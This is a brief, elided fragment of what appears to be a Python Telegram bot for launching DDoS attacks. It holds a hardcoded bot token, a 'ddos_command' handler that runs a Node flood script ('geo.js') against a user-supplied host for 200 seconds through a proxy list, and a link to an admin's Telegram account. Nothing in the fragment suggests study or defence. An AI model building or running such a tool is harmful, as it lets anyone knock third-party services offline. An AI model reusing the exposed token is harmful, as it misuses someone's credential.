...
bot_token = '6734857775:AAHhp4dskfngN52KYZpJ6Fi9EKflXiFE5V4' 
...
def ddos_command(message):
    ...
    command = ["node", "geo.js", host, "200", "64", "5", "proxy.txt"]
    duration = 200
...
def send_admin_link(message):
    bot.reply_to(message, "Telegram: https://t.me/Fockett199")
